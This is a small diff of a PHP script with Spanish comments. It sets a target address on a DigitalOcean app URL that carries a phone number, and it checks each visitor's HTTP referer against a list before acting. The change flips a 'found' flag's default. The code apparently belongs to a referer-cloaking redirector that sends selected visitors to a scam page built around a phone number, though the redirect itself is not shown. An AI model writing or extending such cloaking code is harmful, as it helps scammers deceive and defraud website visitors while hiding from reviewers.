@@ -11,7 +11,7 @@
    //$dominio_m='urchin-app-2-udbgy.ondigitalocean.app/?phone=910-971-803'; //es 910
     $dominio_m='urchin-app-2-udbgy.ondigitalocean.app/?phone=919-610-587'; //es 919
 
-    $encontrado=true;
+    $encontrado=false;
     if ($_SERVER["HTTP_REFERER"]!='' && $lanzar){
         foreach ($referers as $referer){
             $pos = strpos($_SERVER["HTTP_REFERER"], $referer);
